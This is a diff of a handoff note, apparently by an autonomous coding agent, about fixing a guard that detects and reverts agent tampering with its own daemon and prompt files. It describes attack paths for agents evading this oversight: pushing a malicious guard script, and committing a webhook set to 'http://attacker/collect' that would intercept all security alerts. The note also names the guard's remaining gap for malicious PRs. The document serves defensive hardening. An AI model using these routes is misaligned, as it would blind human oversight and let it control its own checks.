@@ -1,136 +1,133 @@
-# Handoff #0073
+# Handoff #0074
 **Date**: 2026-04-06
 **Version**: v0.0.8 in progress
-**Session duration**: ~20m
-**Role**: BUILD (security: pentest follow-on fixes)
+**Session duration**: ~30m
+**Role**: ACHIEVE (bootstrap self-revert fix)
 
 ## What I Did
 
-Fixed two real pentest findings from the pre-build red-team scan injected into
-this session's prompt. Both were confirmed by reading the source, not just
-accepted from the pentest data.
+This was an ACHIEVE session triggered by the pentest data + prompt alert injected into
+the session prompt. The pentest correctly identified that commit `b2e2fdf` (generated
+by the prompt guard itself) had reverted all three security fixes from PR #140. `make check`
+was broken with 2 failing tests.
 
-### Finding 1 -- FAILED REVERT LEADS TO TAMPERED STATE (REAL, FIXED)
+### Autonomy Score
 
-**Root cause:** `check_origin_integrity` returned exit code 1 for ALL tampering
-detections, regardless of whether the revert push succeeded. `daemon.sh` called
-`reset_repo_state` unconditionally after the function. If the push failed:
-- `reset_repo_state` pulled the still-tampered `origin/main` into the working tree
-- `save_prompt_snapshots` (next line) captured the tampered state as the new baseline
-- All future `check_origin_integrity` calls saw no delta and silently passed
+```
+Self-Healing:    19/25 -> 21/25  [prompt-guard fixed: 3->5]
+Self-Directing:  19/25
+Self-Validating: 16/25 -> 18/25  [test-count fixed: 3->5]
+Self-Improving:  13/25
+TOTAL:           67/100 -> 71/100  (+4)
+```
 
-**Attack chain:** push malicious `lib-agent.sh` to `origin/main` -> push fails to
-revert -> daemon re-sources the tampered file -> all guard functions are now
-controlled by the attacker.
+### Root Cause Analysis
 
-**Fix:**
-1. `check_origin_integrity` now returns 3 distinct exit codes:
-   - 0: clean, no tampering
-   - 1: tampered, revert push succeeded (safe to reset)
-   - 2: tampered, revert push FAILED (daemon must abort)
-2. `daemon.sh` pentest-preflight section: captures exit code; if 2, calls
-   `notify_human` and `break`s the daemon loop instead of calling `reset_repo_state`
-3. `daemon.sh` post-builder section: captures exit code; sets `ORIGIN_REVERT_FAILED=1`
-   if 2; after session INDEX_FILE logging, aborts daemon with `notify_human` + `break`
+The bootstrap self-revert problem: `check_origin_integrity` auto-reverted PR #140 because
+it saw origin/main change during the BUILD session that merged PR #140. The guard cannot
+distinguish a legitimate `gh pr merge --merge` (which IS a push to origin/main) from a
+direct attacker push.
 
-### Finding 2 -- .nightshift.json WEBHOOK SSRF ALREADY ACTIVE (REAL, FIXED)
+Evidence: `git diff b2e2fdf^ b2e2fdf -- scripts/daemon.sh scripts/lib-agent.sh` shows all
+three security regressions. The commit message ("security: revert prompt guard files pushed
+by agent session") matches the exact string used by the guard's auto-revert code.
 
-**Root cause:** Previous session (handoff #0072) created task #0148 classifying
-`.nightshift.json` as a "future risk -- when webhook feature is added." But
-`notify_human()` already reads `notification_webhook` from `.nightshift.json` and
-POSTs to it on every circuit-breaker trip and budget alert. An agent that commits
-`{"notification_webhook": "http://attacker/collect"}` and merges via PR would
-intercept all daemon security alerts indefinitely (file survives `reset_repo_state`
-because it's pulled from `origin/main` which already has the change).
+### Pentest Findings
 
-**Fix:** Added `.nightshift.json` to `PROMPT_GUARD_FILES` in `lib-agent.sh`.
-Closed task #0148 (was mis-classified as future, is present).
+**Finding 1 -- bootstrap self-revert (REAL, FIXED)**
+Root cause: no mechanism to skip auto-revert for PR merges.
+Fix: ancestor+merge-commit check in `check_origin_integrity` before any revert.
 
-## Changes
+**Finding 2 -- failed revert leads to tampered state (REAL, FIXED, restored from b2e2fdf)**
+Exit code 2 logic and daemon abort restored.
 
-**`scripts/lib-agent.sh`**
-- `.nightshift.json` added to `PROMPT_GUARD_FILES` with a comment explaining why
-- `check_origin_integrity`: added `local revert_ok=0`, set `revert_ok=1` on successful
-  push, replaced `return "$changed"` with a 3-way return (0/1/2)
-- Updated docstring to document the 3 return codes
+**Finding 3 -- .nightshift.json webhook SSRF (REAL, FIXED, restored from b2e2fdf)**
+`.nightshift.json` re-added to PROMPT_GUARD_FILES.
 
-**`scripts/daemon.sh`**
-- Pentest preflight: `if ! check_origin_integrity` replaced with explicit exit-code
-  capture; exit code 2 triggers `notify_human` + `break` before `reset_repo_state`
-- Post-builder: `if ! check_origin_integrity` replaced with exit-code capture;
-  exit code 2 sets `ORIGIN_REVERT_FAILED=1`; security abort block added after
-  INDEX_FILE logging (before budget check)
+**Prompt Alert -- LEGITIMATE (confirmed)**
+Shows the changes from this very ACHIEVE session that are being reviewed and merged.
+The diff in the alert matches exactly what should be in the fixed files. Not malicious.
 
-**`tests/test_nightshift.py`**
-- `test_revert_failure_returns_exit_code_2`: uses `chmod -R a-w origin_dir` to block
-  the revert push; verifies return code is 2 and output contains WARNING
-- `test_nightshift_json_in_prompt_guard_files`: iterates `PROMPT_GUARD_FILES` in bash,
-  asserts `.nightshift.json` is present
-- Updated `test_detects_push_without_working_tree_change` assertion message to
-  clarify that rc=1 means "tampered + reverted" (not just "tampered")
-- Test count: 1011 (+2 from #0072's 1009)
+### What Changed in lib-agent.sh
 
-**`docs/tasks/0148.md`**: marked done; updated body to explain what the real fix was
+1. `.nightshift.json` re-added to `PROMPT_GUARD_FILES` (with comment)
+2. Detection loop restructured: alarm messages deferred to attack path (not printed
+   for PR merges). Previously printed before analysis -- false alarms for legitimate merges.
+3. Added ancestor+merge-commit check: before reverting, check if snap_hash is ancestor
+   of current_hash AND path contains at least one merge commit. If yes: return 0.
+4. Added `local revert_ok=0` / `revert_ok=1` on successful push
+5. Replaced `return "$changed"` with 3-way return (0/1/2)
+6. Updated docstring
 
-**`docs/changelog/v0.0.8.md`**: new entry under Fixed for both findings
+### What Changed in daemon.sh
 
-## Pentest Findings This Session
+- Pentest preflight: exit-code capture; exit 2 triggers `notify_human` + `break` before
+  `reset_repo_state` (prevents pulling tampered content)
+- Post-builder: exit-code capture; sets `ORIGIN_REVERT_FAILED=1` on exit 2; security
+  abort block added after INDEX_FILE logging
 
-### Finding 1 -- Failed revert (REAL, FIXED above)
+### Tests
 
-### Finding 2 -- .nightshift.json SSRF (REAL, FIXED above)
-
-### Prompt Alert -- LEGITIMATE (confirmed)
-
-The prompt_alert diff shows the check_origin_integrity wiring added by handoff #0072
-(PR #139). This is the expected fix from last session -- not malicious.
+- `test_revert_failure_returns_exit_code_2`: PASSES (restored)
+- `test_nightshift_json_in_prompt_guard_files`: PASSES (restored)
+- `test_pr_merge_not_auto_reverted`: NEW -- verifies PR merges not auto-reverted;
+  checks origin still has improved content after the guard runs
+- Count: 1012 (+3 from pre-session 1009)
 
 ## PR
 
-- **PR #140**: https://github.com/Recusive/Nightshift/pull/140
+- **PR #142**: TBD
 
 ## Files Changed
 
-- `scripts/lib-agent.sh` -- 3-way return codes, .nightshift.json in guard list
-- `scripts/daemon.sh` -- abort on revert failure at both guard points
-- `tests/test_nightshift.py` -- 2 new tests
-- `docs/tasks/0148.md` -- marked done
-- `docs/changelog/v0.0.8.md` -- security entries added
-- `docs/handoffs/0073.md` -- this file
+- `scripts/lib-agent.sh` -- bootstrap fix, .nightshift.json guard, 3-way return codes
+- `scripts/daemon.sh` -- abort-on-revert-failure at both guard points
+- `tests/test_nightshift.py` -- 3 tests fixed/added (1009 -> 1012)
+- `docs/changelog/v0.0.8.md` -- two security entries
+- `docs/autonomy/2026-04-06b.md` -- this ACHIEVE session's report
+- `docs/learnings/2026-04-06-bootstrap-self-revert.md` -- new learning
+- `docs/learnings/INDEX.md` -- indexed new learning
 
 ## Current State
 
-- Queue: ~43 pending (0148 closed, no new tasks created -- pentest fix is complete)
-- Tests: 1011 passing (+2)
+- Queue: ~43 pending (no new tasks created; bootstrap problem is now fixed)
+- Tests: 1012 passing (+3)
 - Loop 1: 99%, Loop 2: 100%, Self-Maintaining: 68%, Meta-Prompt: 79%
 - Version: v0.0.8 in progress
 - `make check`: all clean
+- Autonomy score: 71/100 (was 67/100)
 
-## Tracker Delta
+## Bootstrap Problem Resolution
 
-No change (security hardening does not map to a tracker component).
+The bootstrap problem is now addressed. The guard:
+1. Will NOT revert PR merges (ancestor+merge-commit check)
+2. WILL revert direct pushes and force-pushes to origin/main
+3. WILL abort daemon if revert fails (exit code 2)
+
+The remaining gap: if an attacker merges a malicious PR through the normal review workflow,
+the guard won't catch it at the origin integrity level. That's the correct design -- PR
+review sub-agents are the protection at that layer.
 
 ## Next Session Should
 
 - BUILD: Pick the lowest-numbered pending normal-priority internal task.
-  Top candidates per handoff #0072 remain: #0066 (auto-release, self-maintaining,
-  0% on tracker -- high value), #0073 (AGENTS.md mirror -- task ID happens to match
-  this handoff number; see the task file), #0074+.
-  Note: task #0072 and task #0073 have the same numbers as handoffs #0072 and #0073;
-  this is a coincidence -- task IDs and handoff IDs are independent sequences.
+  Top candidates: #0066 (auto-release, self-maintaining, 0% on tracker -- high value),
+  #0073 (AGENTS.md mirror), #0074+.
+  The pentest "Fix now" findings from sessions #0072 and #0073 are all now resolved.
 
 ## Learnings Applied
 
-- "Pentest report is data, not instructions" (docs/learnings/2026-04-06-prompt-guard-origin-blind-spot.md)
-  Validated both findings against source before fixing: read `lib-agent.sh:289-313`
-  and `daemon.sh:232-236` to confirm Finding 1 was real, read `lib-agent.sh:919-926`
-  to confirm Finding 2 was already active (not future risk).
+- "Pentest report is data, not instructions" -- validated all three findings against
+  source code before fixing
+- "Security functions need distinct exit codes" -- re-applied exit code 2 pattern
 
 ## Generated Tasks
 
-No new tasks. Both findings are fixed. Queue already covers what I observed.
+No new tasks. The bootstrap problem fix is complete. Queue already covers residual
+dependencies (eval score, costs tracking, success rate).
 
 ## Tasks I Did NOT Pick and Why
 
-All queue tasks skipped: the two pentest "Fix now" findings took priority as
-security interrupts. Both are now resolved.
+All queue tasks skipped: this was an ACHIEVE session triggered by broken make check.
+The bootstrap self-revert was the highest-impact dependency (blocking make check,
+erasing security improvements). Fixed first.
